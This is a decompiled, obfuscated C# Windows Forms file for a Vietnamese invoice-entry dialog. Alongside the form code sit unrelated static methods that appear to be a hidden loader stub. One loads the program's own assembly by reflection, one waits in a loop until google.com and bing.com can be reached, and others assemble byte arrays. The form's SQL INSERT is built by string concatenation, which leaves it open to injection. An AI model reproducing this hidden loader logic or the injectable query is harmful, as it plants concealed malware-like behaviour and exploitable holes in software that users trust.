using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Bb9w;
using Ht3;
using Microsoft.VisualBasic.CompilerServices;
using Pp27;
using Rx8m;
using j3WH;

namespace Cb4;

[DesignerGenerated]
public class j1C : Form
{
	private Label _txtMaHD;

	private Label _txtMaKH;

	private TextBox _txtMaHDD;

	private TextBox _txtMaKHH;

	private Button _btnOk;

	private Button _btnCanc;

	private f1T9 dataaccess;

	internal IContainer g;

	internal Label R;

	internal DateTimePicker h;

	public j1C()
	{
		dataaccess = new f1T9();
		Ng9();
	}

	protected override void j4Z(bool Md7)
	{
		try
		{
			if (Md7 && g != null)
			{
				g.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(Md7);
		}
	}

	private void Ng9()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		Qy9(new Label());
		f3P(new Label());
		p7Q(new Label());
		Aw0(new TextBox());
		g4K(new TextBox());
		Yw6(new Button());
		j8M(new Button());
		f6S(new DateTimePicker());
		((Control)this).SuspendLayout();
		m7Q().set_AutoSize(true);
		((Control)m7Q()).set_Location(new Point(13, 26));
		((Control)m7Q()).set_Name("txtMaHD");
		((Control)m7Q()).set_Size(new Size(41, 13));
		((Control)m7Q()).set_TabIndex(0);
		m7Q().set_Text("Ma HD");
		w6W().set_AutoSize(true);
		((Control)w6W()).set_Location(new Point(12, 64));
		((Control)w6W()).set_Name("txtMaKH");
		((Control)w6W()).set_Size(new Size(40, 13));
		((Control)w6W()).set_TabIndex(1);
		w6W().set_Text("Ma KH");
		Mt2().set_AutoSize(true);
		((Control)Mt2()).set_Location(new Point(12, 107));
		((Control)Mt2()).set_Name("Label3");
		((Control)Mt2()).set_Size(new Size(53, 13));
		((Control)Mt2()).set_TabIndex(2);
		Mt2().set_Text("Ngay Lap");
		((Control)Kx3()).set_Location(new Point(75, 26));
		((Control)Kx3()).set_Name("txtMaHDD");
		((Control)Kx3()).set_Size(new Size(197, 20));
		((Control)Kx3()).set_TabIndex(3);
		((Control)Fj0()).set_Location(new Point(75, 61));
		((Control)Fj0()).set_Name("txtMaKHH");
		((Control)Fj0()).set_Size(new Size(197, 20));
		((Control)Fj0()).set_TabIndex(4);
		((Control)c3F()).set_Location(new Point(49, 163));
		((Control)c3F()).set_Name("btnOk");
		((Control)c3F()).set_Size(new Size(75, 23));
		((Control)c3F()).set_TabIndex(6);
		((ButtonBase)c3F()).set_Text("OK");
		((ButtonBase)c3F()).set_UseVisualStyleBackColor(true);
		((Control)k0B()).set_Location(new Point(163, 163));
		((Control)k0B()).set_Name("btnCanc");
		((Control)k0B()).set_Size(new Size(75, 23));
		((Control)k0B()).set_TabIndex(7);
		((ButtonBase)k0B()).set_Text("Cancel");
		((ButtonBase)k0B()).set_UseVisualStyleBackColor(true);
		((Control)c0H()).set_Location(new Point(71, 101));
		((Control)c0H()).set_Name("datetimeNgayLap");
		((Control)c0H()).set_Size(new Size(200, 20));
		((Control)c0H()).set_TabIndex(8);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(284, 262));
		((Control)this).get_Controls().Add((Control)(object)c0H());
		((Control)this).get_Controls().Add((Control)(object)k0B());
		((Control)this).get_Controls().Add((Control)(object)c3F());
		((Control)this).get_Controls().Add((Control)(object)Fj0());
		((Control)this).get_Controls().Add((Control)(object)Kx3());
		((Control)this).get_Controls().Add((Control)(object)Mt2());
		((Control)this).get_Controls().Add((Control)(object)w6W());
		((Control)this).get_Controls().Add((Control)(object)m7Q());
		((Control)this).set_Name("AddHD");
		((Form)this).set_Text("AddHD");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual Label m7Q()
	{
		return _txtMaHD;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Qy9(Label Mb5)
	{
		_txtMaHD = Mb5;
	}

	[SpecialName]
	internal virtual Label w6W()
	{
		return _txtMaKH;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void f3P(Label q6X)
	{
		_txtMaKH = q6X;
	}

	[SpecialName]
	internal virtual Label Mt2()
	{
		return R;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void p7Q(Label Ge1)
	{
		Label val = (R = Ge1);
	}

	[SpecialName]
	internal virtual TextBox Kx3()
	{
		return _txtMaHDD;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Aw0(TextBox Wi3)
	{
		_txtMaHDD = Wi3;
	}

	[SpecialName]
	internal virtual TextBox Fj0()
	{
		return _txtMaKHH;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void g4K(TextBox c3M)
	{
		_txtMaKHH = c3M;
	}

	[SpecialName]
	internal virtual Button c3F()
	{
		return _btnOk;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Yw6(Button p2C)
	{
		EventHandler eventHandler = r7B;
		Button btnOk = _btnOk;
		if (btnOk != null)
		{
			((Control)btnOk).remove_Click(eventHandler);
		}
		_btnOk = p2C;
		btnOk = _btnOk;
		if (btnOk != null)
		{
			((Control)btnOk).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button k0B()
	{
		return _btnCanc;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void j8M(Button Fn6)
	{
		EventHandler eventHandler = Fq3;
		Button btnCanc = _btnCanc;
		if (btnCanc != null)
		{
			((Control)btnCanc).remove_Click(eventHandler);
		}
		_btnCanc = Fn6;
		btnCanc = _btnCanc;
		if (btnCanc != null)
		{
			((Control)btnCanc).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual DateTimePicker c0H()
	{
		return h;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void f6S(DateTimePicker r9G)
	{
		DateTimePicker val = (h = r9G);
	}

	private bool Kc1()
	{
		string text = "INSERT INTO HoaDon (MaHD,MaKH,Ngaylap)";
		text += $"VALUES ('{Kx3().get_Text()}','{Fj0().get_Text()}','{c0H().get_Value().Date}')";
		return dataaccess.Li4f(text);
	}

	internal static string[] b6K()
	{
		f3N.p2M();
		Assembly value = Assembly.LoadFrom(Environment.GetCommandLineArgs()[0]);
		Lp07.mDic.Add("Ass", value);
		return Dt07.Ny80();
	}

	internal static bool Je3()
	{
		string[] array = new string[2] { "https://www.google.com/", "https://www.bing.com/" };
		int num = 0;
		checked
		{
			while (num != 2)
			{
				string[] array2 = array;
				foreach (string n1HM in array2)
				{
					if (!f1T9.Ki1q(n1HM))
					{
						if (num > 0)
						{
							num--;
						}
						Task.Delay(30000).Wait();
					}
					else
					{
						num++;
					}
				}
			}
			if (num == 2)
			{
				return true;
			}
			return false;
		}
	}

	private bool z9P()
	{
		return string.IsNullOrEmpty(Kx3().get_Text()) || string.IsNullOrEmpty(Fj0().get_Text()) || string.IsNullOrEmpty(Conversions.ToString(c0H().get_Value().Date));
	}

	internal static byte[] x6R(int Kd7)
	{
		return a0M7.q3DC(Kd7, checked(Kd7 + 1 - 22));
	}

	private void r7B(object sender, EventArgs e)
	{
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Unknown result type (might be due to invalid IL or missing references)
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
		if (z9P())
		{
			MessageBox.Show("Chua nhap gia tri", "Error", (MessageBoxButtons)0);
			return;
		}
		if (Kc1())
		{
			MessageBox.Show("Them thanh cong", "Success", (MessageBoxButtons)0);
			((Form)this).set_DialogResult((DialogResult)1);
		}
		else
		{
			MessageBox.Show("Them that bai", "Error", (MessageBoxButtons)0);
			MessageBox.Show("ID " + Fj0().get_Text() + "Ten: " + Kx3().get_Text() + "Date: " + Conversions.ToString(c0H().get_Value()));
			((Form)this).set_DialogResult((DialogResult)7);
		}
		((Form)this).Close();
	}

	internal static byte[] Ef3(int[] r3G, int Sz3)
	{
		checked
		{
			byte[] array = new byte[Sz3 + 1];
			int num = r3G.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				array[i] = (byte)r3G[i];
			}
			return array;
		}
	}

	private void Fq3(object sender, EventArgs e)
	{
		((Form)this).Close();
	}
}
